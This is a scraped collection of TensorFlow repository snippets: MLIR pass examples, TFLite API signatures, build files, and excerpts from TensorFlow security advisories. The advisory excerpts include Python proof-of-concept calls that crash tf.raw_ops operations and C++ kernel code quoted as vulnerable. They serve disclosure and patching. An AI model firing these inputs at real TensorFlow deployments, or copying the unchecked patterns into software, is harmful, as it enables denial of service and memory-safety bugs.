SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_60

LANGUAGE: MLIR
CODE:
```
This operator is trivially lowered to tosa.CONST
```

LANGUAGE: MLIR
CODE:
```
tosa.CONST
```

----------------------------------------

TITLE: Output Example: Merged Island in TF Executor Graph (Coarsening)
DESCRIPTION: This MLIR snippet shows the result after applying the `-tf-executor-island-coarsening` pass to the previous example. The two separate `tf_executor.island` operations have been successfully merged into a single island.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_14

LANGUAGE: MLIR
CODE:
```
  func @test(%arg0: tensor<i1>) -> tensor<f32> {
    %0 = tf_executor.graph {
      %outputs, %control = tf_executor.island {
        %1 = "tf.opA"(%arg0) : (tensor<i1>) -> tensor<i1>
        %2 = "tf.opB"() : () -> tensor<f32>
        tf_executor.yield %2 : tensor<f32>
      }
      tf_executor.fetch %outputs : tensor<f32>
    }
    return %0 : tensor<f32>
  }
```

----------------------------------------

TITLE: Macro populate_tflite_source_vars
DESCRIPTION: Defines a CMake macro that wraps `populate_source_vars` to work relative to the `TFLITE_SOURCE_DIR`. It simplifies finding source and header files within the TensorFlow Lite specific source directories, applying the same filtering logic.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_10

LANGUAGE: CMake
CODE:
```
# Simplifies inclusion of non-test sources and headers from a directory
# relative to TFLITE_SOURCE_DIR. See populate_source_vars() for the
# description of arguments including and following SOURCES_VAR.
macro(populate_tflite_source_vars RELATIVE_DIR SOURCES_VAR)
  populate_source_vars(
    "${TFLITE_SOURCE_DIR}/${RELATIVE_DIR}" ${SOURCES_VAR} ${ARGN}
  )
endmacro()
```

----------------------------------------

TITLE: Calculating Input Size in TFLite C++ Convolution
DESCRIPTION: This snippet shows a line of code from TensorFlow Lite's convolution kernel where the 'input_size' is calculated by dividing the total number of elements by the size of the first dimension. This calculation was identified as a source of vulnerability because the divisor (SizeOfDimension(input, 0)) was not checked for a zero value, potentially leading to a division-by-zero error if a malformed input tensor was provided.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-082.md#_snippet_0

LANGUAGE: C++
CODE:
```
const int input_size = NumElements(input) / SizeOfDimension(input, 0);
```

----------------------------------------

TITLE: Checking Buffer Identifier Python
DESCRIPTION: This class method checks if the provided buffer contains the correct flatbuffer identifier for the `SentencePieceTokenizerOptions` type. It takes the buffer, offset, and an optional flag for size prefixing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptions.md#_snippet_6

LANGUAGE: python
CODE:
```
@classmethod
SentencePieceTokenizerOptionsBufferHasIdentifier(
    buf, offset, size_prefixed=False
)
```

----------------------------------------

TITLE: Calling AudioSpectrogram with zero stride in TensorFlow (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a Floating-Point Exception (FPE) in TensorFlow's `tf.raw_ops.AudioSpectrogram` operation. It sets the `stride` parameter to 0, which causes a division-by-zero error in the underlying C++ implementation, reproducing the vulnerability TFSA-2023-008. This snippet requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2023-008.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

para = {'input': tf.constant([[14.], [24.]], dtype=tf.float32), 'window_size': 1, 'stride': 0, 'magnitude_squared': False}
func = tf.raw_ops.AudioSpectrogram

@tf.function(jit_compile=True)
def fuzz_jit():
   y = func(**para)
   return y

fuzz_jit()
```

----------------------------------------

TITLE: Triggering CollectiveGather CHECK Fail Vulnerability - TensorFlow Python
DESCRIPTION: This Python code snippet demonstrates how providing a scalar input (`arg_0=1`) to the `tf.raw_ops.CollectiveGather` operation can trigger the reported `CHECK` failure vulnerability, which can lead to a denial of service. It sets up arguments attempting to call the operation with a scalar value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-126.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
arg_0=1
arg_1=1
arg_2=1
arg_3=1
arg_4=(3, 3,3)
arg_5='auto'
arg_6=0
arg_7=''
tf.raw_ops.CollectiveGather(input=arg_0, group_size=arg_1, group_key=arg_2,
                            instance_key=arg_3, shape=arg_4,
                            communication_hint=arg_5, timeout_seconds=arg_6, name=arg_7)
```

----------------------------------------

TITLE: Demonstrating TensorFlow ResourceGather Vulnerability Python
DESCRIPTION: This Python snippet demonstrates how to trigger the heap out-of-bounds read or CHECK failure vulnerability in `tf.raw_ops.ResourceGather`. It creates a Variable and calls `ResourceGather` with a `batch_dims` value (10) that is larger than the resource tensor's rank (2), exploiting the lack of validation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-128.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tensor = tf.constant(value=[[1,2],[3,4],[5,6]],shape=(3,2),dtype=tf.uint32)
v = tf.Variable(tensor)
tf.raw_ops.ResourceGather(
  resource=v.handle,
  indices=[0],
  dtype=tf.uint32,
  batch_dims=10,
  validate_indices=False)
```

----------------------------------------

TITLE: Demonstrating Denial of Service in TensorFlow SetSize
DESCRIPTION: This Python snippet demonstrates a vulnerability in `tf.raw_ops.SetSize` where providing a non-1D tensor (a scalar `1` in this case) for the `set_shape` argument triggers a `CHECK` failure, leading to a denial of service. Requires the `tensorflow` library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-127.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
arg_0=1
arg_1=[1,1]
arg_2=1
arg_3=True
arg_4=''
tf.raw_ops.SetSize(set_indices=arg_0, set_values=arg_1, set_shape=arg_2,
                   validate_indices=arg_3, name=arg_4)
```

----------------------------------------

TITLE: Wrapping Outside Compiled Ops in Host Launch MLIR TensorFlow
DESCRIPTION: Shows how the -tf-outside-compiled-to-host-launch pass wraps ops marked with the _xla_outside_compilation attribute into a tf_device.launch operation assigned to the host device. The first block shows the cluster with a marked op, and the second shows the transformed cluster with the op wrapped in a host launch.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_34

LANGUAGE: MLIR
CODE:
```
  "tf_device.cluster"() ( {
    "tf.A"()
    "tf.B"() {_xla_outside_compilation = "cluster1"}
    "tf.C"()
    tf_device.return
  }) {num_cores_per_replica = 1, topology =  "", device_assignment =  []}
```

LANGUAGE: MLIR
CODE:
```
  "tf_device.cluster"() ( {
    "tf.A"()
    "tf_device.launch"() {
      "tf.B"() {_xla_outside_compilation = "cluster1"}
      tf_device.return
    } {device = "TPU_REPLICATED_HOST_0"} : () -> ()
    "tf.C"()
    tf_device.return
  }) {num_cores_per_replica = 1, topology = "", device_assignment = []}
```

----------------------------------------

TITLE: Creating ContentAddRange in TFLite Metadata Python
DESCRIPTION: This function is likely a helper method within the FlatBuffers Python binding generated code for the TFLite metadata schema. It is used to add a `ContentAddRange` object (or initiate its construction) within a FlatBuffer builder instance. It requires a FlatBuffer builder and the specific 'range' data to be added.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ContentAddRange.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ContentAddRange(
    builder, range
)
```

----------------------------------------

TITLE: Converting TF Unified Attributes to Legacy MLIR
DESCRIPTION: Shows the conversion of unified `_replication_info` and `_xla_compile_device_type` attributes back to the legacy `_tpu_replicate` attribute on a `tf_executor.island` op in TensorFlow MLIR.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_1

LANGUAGE: MLIR
CODE:
```
%control = tf_executor.island wraps "tf.TPUReplicateMetadata"() {_replication_info = "cluster", _xla_compile_device_type = "TPU", allow_soft_placement = false, computation_shape = [], device = "", device_assignment = [], host_compute_core = [], name = "TPUReplicateMetadata", num_cores_per_replica = 1 : i64, num_replicas = 1 : i64, step_marker_location = "STEP_MARK_AT_ENTRY", topology = "", use_spmd_for_xla_partitioning = false, use_tpu = true} : () -> ()

```

LANGUAGE: MLIR
CODE:
```
%control = tf_executor.island wraps "tf.TPUReplicateMetadata"() {_tpu_replicate = "cluster", allow_soft_placement = false, computation_shape = [], device = "", device_assignment = [], host_compute_core = [], name = "TPUReplicateMetadata", num_cores_per_replica = 1 : i64, num_replicas = 1 : i64, step_marker_location = "STEP_MARK_AT_ENTRY", topology = "", use_tpu = true, use_spmd_for_xla_partitioning = false} : () -> ()

```

----------------------------------------

TITLE: Initializing BertTokenizerOptionsT - Python
DESCRIPTION: This snippet shows the signature for the default constructor of the `BertTokenizerOptionsT` class. It is used to create a new instance of the object, representing configuration options for a Bert Tokenizer within the TFLite metadata schema. The constructor takes no parameters and returns a new `BertTokenizerOptionsT` object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BertTokenizerOptionsT.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.BertTokenizerOptionsT()
```

----------------------------------------

TITLE: Add Max Value to FlatBuffers ValueRange - Python
DESCRIPTION: Adds the maximum value field to a ValueRange object being built using a FlatBuffers builder. Requires the builder instance and the integer maximum value as parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ValueRangeAddMax.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.ValueRangeAddMax(
    builder, max
)
```

----------------------------------------

TITLE: Listing Quantization Model APIs (C++)
DESCRIPTION: This snippet lists C++ symbols for model quantization functions, exposed by the `//tensorflow/compiler/mlir/quantization/tensorflow/python:quantize_model_cc` build target. It includes various functions for quantizing models using different techniques like QAT, PTQ, static range, dynamic range, and weight-only quantization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/def_file_filter/symbols_pybind.txt#_snippet_8

LANGUAGE: C++
CODE:
```
tensorflow::quantization::QuantizeQatModel
```

LANGUAGE: C++
CODE:
```
tensorflow::quantization::QuantizePtqModelPreCalibration
```

LANGUAGE: C++
CODE:
```
tensorflow::quantization::QuantizePtqModelPostCalibration
```

LANGUAGE: C++
CODE:
```
tensorflow::quantization::QuantizeStaticRangePtq
```

LANGUAGE: C++
CODE:
```
tensorflow::quantization::QuantizeDynamicRangePtq
```

LANGUAGE: C++
CODE:
```
tensorflow::quantization::QuantizeWeightOnly
```

----------------------------------------

TITLE: Iterating and Accessing Weights in TensorFlow Count Op (Vulnerable C++)
DESCRIPTION: This C++ loop, taken from the vulnerable `SparseCountSparseOutput` and `RaggedCountSparseOutput` implementations, iterates through the data values and accesses elements from `weight_values` using the same index `idx`. Without prior validation of the weights tensor size relative to the number of values, this access can result in reading outside the bounds of the allocated heap buffer for weights, causing a heap buffer overflow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-020.md#_snippet_1

LANGUAGE: C++
CODE:
```
    for (int idx = 0; idx < num_values; ++idx) {
      int batch = is_1d ? 0 : indices_values(idx, 0);
      const auto& value = values_values(idx);
      per_batch_counts[batch][value] += weight_values(idx);
   }

```

----------------------------------------

TITLE: Vulnerable Output Allocation in EditDistance Kernel C++
DESCRIPTION: This C++ snippet from the TensorFlow `edit_distance_op.cc` kernel highlights the code responsible for allocating the output tensor and setting its elements to zero. The vulnerability occurs because the `output_shape` is not sufficiently validated; if it results in a zero-element tensor, `output->flat<T>()` returns a flat view on an empty buffer, and calling `setZero()` on this view results in a null pointer dereference. This code is part of the internal TensorFlow implementation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-052.md#_snippet_1

LANGUAGE: c++
CODE:
```
OP_REQUIRES_OK(ctx, ctx->allocate_output("output", output_shape, &output));
auto output_t = output->flat<float>();
output_t.setZero();
```

----------------------------------------

TITLE: Vulnerable Vector Resize Logic in TensorFlow C++ Kernel
DESCRIPTION: This C++ snippet from the TensorFlow core kernel implementation for Non-Max Suppression shows the source of the TFSA-2021-143 vulnerability. It illustrates how the `output_size`, an integer derived from a user-controlled parameter, is used directly in the `std::vector::resize` function. The implicit conversion from a potentially negative integer to an unsigned `size_t` when calling `resize` is the cause of the crash. It relies on TensorFlow internal structures and standard C++ vector operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-143.md#_snippet_1

LANGUAGE: C++
CODE:
```
const int output_size = max_output_size.scalar<int>()();
  // ...
  std::vector<int> selected;
  // ...
  if (pad_to_max_output_size) {
    selected.resize(output_size, 0);
    // ...
  }
```

----------------------------------------

TITLE: Validating TFLite Tensor Indices C++
DESCRIPTION: This snippet shows the validation loop used during TFLite model loading to check tensor indices for validity. While it explicitly checks for `kTfLiteOptionalTensor` (-1), the subsequent comparison `static_cast<size_t>(index) >= context_.tensors_size` fails for negative indices due to type casting, allowing -1 to bypass the bounds check and causing the vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-005.md#_snippet_2

LANGUAGE: C++
CODE:
```
for (int i = 0; i < length; i++) {
    int index = indices[i];
    // Continue if index == kTfLiteOptionalTensor before additional comparisons
    // below, size_t(-1) is always >= context_tensors_size.
    if (index == kTfLiteOptionalTensor) {
      continue;
    }
    if (index < 0 || static_cast<size_t>(index) >= context_.tensors_size) {
      ReportError(
          "Invalid tensor index %d in %s. The subgraph has %d tensors\n", index,
          label, context_.tensors_size);
      consistent_ = false;
      return kTfLiteError;
    }
  }
```

----------------------------------------

TITLE: Vulnerable Access in QuantizedReshape C++ Kernel
DESCRIPTION: This C++ snippet highlights the vulnerable code within the TensorFlow `QuantizedReshape` kernel implementation. It shows how the kernel retrieves the `input_min` (input 2) and `input_max` (input 3) tensors from the context and attempts to access the first element (`(0)`) of their flat representation using `.flat<float>()(0)`. If the input tensors are empty (as shown in the Python example), this access goes out of bounds, leading to a heap buffer overflow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-026.md#_snippet_1

LANGUAGE: c++
CODE:
```
const auto& input_min_float_tensor = ctx->input(2);
...
const float input_min_float = input_min_float_tensor.flat<float>()(0);
const auto& input_max_float_tensor = ctx->input(3);
...
const float input_max_float = input_max_float_tensor.flat<float>()(0);
```

----------------------------------------

TITLE: Vulnerable TFLite Kernel Implementation C++
DESCRIPTION: This C++ code shows a fragment from the optimized kernels implementation within TensorFlow Lite. It illustrates a vulnerable execution path where the pointer 'input1_data_ptr' is dereferenced within a loop structure. This dereference happens unconditionally when the condition 'y4 <= 1' is met, potentially leading to a crash if 'input1_data_ptr' holds a null or invalid address.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-162.md#_snippet_1

LANGUAGE: c++
CODE:
```
  if (y4 > 1) {
    // ...
  } else {
    for (int i0 = 0; i0 < y0; ++i0) {
      const T* input2_data_ptr = nullptr;
      for (int i1 = 0; i1 < y1; ++i1) {
        input2_data_ptr = input2_data_reset;
        for (int i2 = 0; i2 < y2; ++i2) {
          scalar_broadcast_f(y3, params, *input1_data_ptr, input2_data_ptr,
                             output_data_ptr);
        }
      }
    }
  }
```

----------------------------------------

TITLE: Calculating Output Shape in TFLite Segment Sum C++
DESCRIPTION: This C++ snippet from the TensorFlow Lite segment sum kernel shows how the output tensor size (determined by `max_index + 1`) is calculated using the value of the *last* element in the `segment_ids` tensor. This logic assumes the `segment_ids` are sorted, which is the root cause of the vulnerability when they are not.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-002.md#_snippet_0

LANGUAGE: C++
CODE:
```
  if (segment_id_size > 0) {
    max_index = segment_ids->data.i32[segment_id_size - 1];
  }
  TfLiteIntArray* output_shape = TfLiteIntArrayCreate(NumDimensions(data));
  output_shape->data[0] = max_index + 1;
```

----------------------------------------

TITLE: TensorFlow Dequantize Op C++ Implementation - Bug Detail
DESCRIPTION: This C++ snippet from the TensorFlow `dequantize_op.cc` kernel implementation shows the code responsible for the heap OOB read vulnerability. When `num_slices > 1` (corresponding to the 'axis' parameter being used with non-scalar min/max ranges), the code accesses `min_ranges` and `max_ranges` within a loop iterating up to `num_slices`. It fails to validate that the dimensions of `input_min_tensor` and `input_max_tensor` are consistent with `num_slices` before accessing elements at index `i`, potentially reading out of bounds if the input tensor shapes are crafted maliciously.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-070.md#_snippet_1

LANGUAGE: c++
CODE:
```
if (num_slices == 1) {
  const float min_range = input_min_tensor.flat<float>()(0);
  const float max_range = input_max_tensor.flat<float>()(0);
  DequantizeTensor(ctx, input, min_range, max_range, &float_output);
} else {
  ...
  auto min_ranges = input_min_tensor.vec<float>();
  auto max_ranges = input_max_tensor.vec<float>();
  for (int i = 0; i < num_slices; ++i) {
    DequantizeSlice(ctx->eigen_device<Device>(), ctx,
                    input_tensor.template chip<1>(i), min_ranges(i),
                    max_ranges(i), output_tensor.template chip<1>(i));
    ...
  }
}
```

----------------------------------------

TITLE: Ending AssociatedFile Object with FlatBuffer Builder Python
DESCRIPTION: This function is typically called after setting all required fields for an `AssociatedFile` object using a FlatBuffer builder. It finalizes the object and returns an offset to it within the buffer, although the signature shown only takes the `builder` as input, implying it directly interacts with it. It is a crucial step when serializing TFLite metadata containing associated files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFileEnd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.AssociatedFileEnd(
    builder
)
```

----------------------------------------

TITLE: Define Hexagon Library Filegroup in Bazel BUILD
DESCRIPTION: This Bazel BUILD snippet defines a 'filegroup' target to group Hexagon delegate shared libraries. It's necessary when integrating the Hexagon delegate and requires a BUILD file in the directory containing the '.so' files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/android/README.md#_snippet_1

LANGUAGE: Bazel BUILD
CODE:
```
filegroup(
    name = "libhexagon_nn_skel",
    srcs = glob(["*.so"]),
)
```

----------------------------------------

TITLE: Checking AudioProperties Buffer Identifier in Python
DESCRIPTION: Checks if a given buffer contains the correct FlatBuffers identifier for the `AudioProperties` schema. This class method is typically used to verify the type of data contained within a buffer before attempting to parse it. It takes the buffer, an offset, and an optional flag for size-prefixed buffers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AudioProperties.md#_snippet_0

LANGUAGE: python
CODE:
```
@classmethod
AudioPropertiesBufferHasIdentifier(
    buf, offset, size_prefixed=False
)
```

----------------------------------------

TITLE: Check if BoundingBoxProperties Index is None Python
DESCRIPTION: Checks if the 'index' vector field within the bounding box properties is not set or is null. Returns a boolean indicating its presence.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxProperties.md#_snippet_6

LANGUAGE: Python
CODE:
```
IndexIsNone()
```

----------------------------------------

TITLE: Packing TensorMetadataT into Builder Python
DESCRIPTION: This method packs the current `TensorMetadataT` object into a FlatBuffers builder. It takes the `builder` object as an argument and returns the offset within the builder where the object is packed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadataT.md#_snippet_4

LANGUAGE: Python
CODE:
```
Pack(
    builder
)
```

----------------------------------------

TITLE: Calling BoostedTreesCalculateBestFeatureSplitV2 API - TensorFlow Python
DESCRIPTION: This Python snippet illustrates a similar vulnerability scenario involving the `tf.raw_ops.BoostedTreesCalculateBestFeatureSplitV2` operation in TensorFlow. Like the other affected operation, providing an empty `node_id_range` and specific input parameters can lead to undefined behavior due to insufficient input validation. It depends on the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-136.md#_snippet_1

LANGUAGE: Python
CODE:
```
import tensorflow as tf

tf.raw_ops.BoostedTreesCalculateBestFeatureSplitV2(
  node_id_range=[],
  stats_summaries_list=[[1,2,3]],
  split_types=[''],
  candidate_feature_ids=[1,2,3,4],
  l1=[1],
  l2=[1],
  tree_complexity=[1.0],
  min_node_weight=[1.17],
  logits_dimension=5)
```

----------------------------------------

TITLE: Vocabulary Generation Flag in AverageWordVecSpec
DESCRIPTION: Boolean flag indicating whether vocabulary generation is required for this model specification. If true, `gen_vocab` must be called or a vocabulary loaded.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/AverageWordVecSpec.md#_snippet_17

LANGUAGE: python
CODE:
```
True
```

----------------------------------------

TITLE: Checking Equality with ClassificationResult in Python
DESCRIPTION: This code snippet presents the signature for the `__eq__` method of the `ClassificationResult` class. This method is used to determine if the current `ClassificationResult` object is equal to another object, typically another instance of the same class. It takes any object as input and returns a boolean indicating equality.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/ClassificationResult.md#_snippet_1

LANGUAGE: Python
CODE:
```
__eq__(\n    other: Any\n) -> bool
```

----------------------------------------

TITLE: TensorFlow Add Dimension with Overflow Check - C++
DESCRIPTION: This C++ snippet shows the `AddDimWithStatus` method. It adds a single dimension and crucially checks for integer overflow when calculating the total number of elements using `MultiplyWithoutOverflow`. If an overflow is detected, it returns an `errors::Internal` status, which is then caught by `InitDims` and the `TF_CHECK_OK` in the constructor.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-024.md#_snippet_3

LANGUAGE: c++
CODE:
```
template <class Shape>
Status TensorShapeBase<Shape>::AddDimWithStatus(int64 size) {
  ...
  int64 new_num_elements;
  if (kIsPartial && (num_elements() < 0 || size < 0)) {
    new_num_elements = -1;
  } else {
    new_num_elements = MultiplyWithoutOverflow(num_elements(), size);
    if (TF_PREDICT_FALSE(new_num_elements < 0)) {
        return errors::Internal("Encountered overflow when multiplying ",
                                num_elements(), " with ", size,
                                ", result: ", new_num_elements);
      }
  }
  ...
}
```

----------------------------------------

TITLE: Lowering tf.Squeeze to TOSA MLIR
DESCRIPTION: Documents the lowering of the TensorFlow `tf.Squeeze` operation, which removes dimensions of size 1, to the TOSA dialect's `lower_squeeze_op`. It uses the `squeeze_dims` attribute to specify which dimensions to remove.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_40

LANGUAGE: MLIR
CODE:
```
%output = tf.Squeeze(%input) {squeeze_dims}
```

LANGUAGE: MLIR
CODE:
```
%output = lower_squeeze_op(%input, squeeze_dims)
```

----------------------------------------

TITLE: Initializing ContentStart - TFLite Support - Python
DESCRIPTION: Provides the function signature for `ContentStart` in the `tflite_support.metadata_schema_py_generated` module. This function is called with a `builder` object, likely to start defining a content section within the metadata schema generation process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ContentStart.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.ContentStart(
    builder
)
```

----------------------------------------

TITLE: Calculating TFLite DepthToSpace Output Channels C++
DESCRIPTION: This C++ snippet from the TFLite kernel demonstrates the calculation of `output_channels` within the `DepthToSpace` operator. It shows the division of `input_channels` by `block_size` twice, highlighting the line where the division-by-zero vulnerability occurs if `block_size` is zero. It depends on the `params` structure containing `block_size` and the `input` tensor dimensions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-081.md#_snippet_0

LANGUAGE: C++
CODE:
```
const int block_size = params->block_size;
...
const int input_channels = input->dims->data[3];
...
int output_channels = input_channels / block_size / block_size;
```

----------------------------------------

TITLE: Implementing Custom Composable Splitter (Python)
DESCRIPTION: Provides an example of subclassing `ComposableSplitter` to create a `SavedModelSplitter`. It shows how to override the `build_chunks` method to delegate splitting of nested parts (`ObjectGraphDef`, `GraphDef`) to specialized splitters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/proto_splitter/README.md#_snippet_2

LANGUAGE: python
CODE:
```
class SavedModelSplitter(ComposableSplitter):
  def build_chunks(self):
    ObjectGraphSplitter(
      saved_model.meta_graphs[0].object_graph_def,
      parent_splitter=self,
      fields_in_parent=["meta_graphs", 0, "object_graph_def"]
    ).build_chunks()

    GraphDefSplitter(
      saved_model.meta_graphs[0].graph_def,
      parent_splitter=self,
      fields_in_parent=["meta_graphs", 0, "graph_def"],
    ).build_chunks()

# See the results:
A.split()  # [...chunks from B, ...chunks from C]
```

----------------------------------------

TITLE: Building and Pushing Sample Delegate for Android Test (Bash)
DESCRIPTION: Builds the TensorFlow Lite sample stable delegate shared library for Android ARM64 architecture using Bazel and pushes it to a temporary directory on a connected Android device using adb.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/README.md#_snippet_0

LANGUAGE: bash
CODE:
```
bazel build -c opt --config=android_arm64 //tensorflow/lite/delegates/utils/experimental/sample_stable_delegate:tensorflowlite_sample_stable_delegate
adb push "$(bazel info -c opt --config=android_arm64 bazel-bin)"/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/libtensorflowlite_sample_stable_delegate.so /data/local/tmp
```

----------------------------------------

TITLE: Handling Type Specialization Result in Shape Inference Context (C++)
DESCRIPTION: This C++ snippet from `tensorflow/core/framework/shape_inference.cc` shows the logic within `InferenceContext::PreInputInit` for specializing types using `full_type::SpecializeType`. The vulnerability lies here: if `SpecializeType` returns an error status, the subsequent `DCHECK` only catches it in debug builds. In production builds, execution proceeds to `ret.ValueOrDie()`, causing a crash because 'ret' holds an error, not a value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-035.md#_snippet_0

LANGUAGE: C++
CODE:
```
void InferenceContext::PreInputInit(
    const OpDef& op_def, const std::vector<const Tensor*>& input_tensors,
    const std::vector<ShapeHandle>& input_tensors_as_shapes) {
  const auto ret = full_type::SpecializeType(attrs_, op_def);
  DCHECK(ret.status().ok()) << "while instantiating types: " << ret.status();
  ret_types_ = ret.ValueOrDie();
  // ...
}
```

----------------------------------------

TITLE: Demonstrating RaggedTensorToSparse Vulnerability - Python
DESCRIPTION: This Python snippet demonstrates a security vulnerability in `tf.raw_ops.RaggedTensorToSparse`. By providing malformed `rt_nested_splits` and empty `rt_dense_values`, it triggers a reference binding to a null pointer, leading to undefined behavior or a crash. This specific input highlights the insufficient validation of the input splits.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-130.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.RaggedTensorToSparse(
  rt_nested_splits=[[0, 38, 0]],
  rt_dense_values=[])
```

----------------------------------------

TITLE: Demonstrating Undefined Behavior in tf.raw_ops.FractionalMaxPoolGrad (Python)
DESCRIPTION: This Python snippet demonstrates the undefined behavior vulnerability in `tf.raw_ops.FractionalMaxPoolGrad`. It calls the operation with an empty `orig_output` tensor, which is not validated by the kernel, leading to unexpected behavior in vulnerable TensorFlow versions. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-066.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

orig_input = tf.constant([2, 3], shape=[1, 1, 1, 2], dtype=tf.int64)
orig_output = tf.constant([], dtype=tf.int64)
out_backprop = tf.zeros([2, 3, 6, 6], dtype=tf.int64)
row_pooling_sequence = tf.constant([0], shape=[1], dtype=tf.int64)
col_pooling_sequence = tf.constant([0], shape=[1], dtype=tf.int64)

tf.raw_ops.FractionalMaxPoolGrad(
  orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop,
  row_pooling_sequence=row_pooling_sequence,
  col_pooling_sequence=col_pooling_sequence, overlapping=False)
```

----------------------------------------

TITLE: Demonstrating DenseBincount Vulnerability in TensorFlow Python
DESCRIPTION: This Python code snippet demonstrates the TensorFlow `DenseBincount` vulnerability (CVE-2022-35987). It creates input tensors with specific shapes, including a `weights` tensor with a shape that does not match the `input` tensor (neither being the same shape nor length-0). Executing this code with an unpatched TensorFlow version will trigger a `CHECK` fail within the `tf.raw_ops.DenseBincount` operation, leading to program termination and a denial of service.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-118.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf
binary_output = True
input = tf.random.uniform(shape=[0, 0], minval=-10000, maxval=10000, dtype=tf.int32, seed=-2460)
size = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)
weights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)
tf.raw_ops.DenseBincount(input=input, size=size, weights=weights, binary_output=binary_output)
```

----------------------------------------

TITLE: Resolving Negative Axis Index in TFLite C++
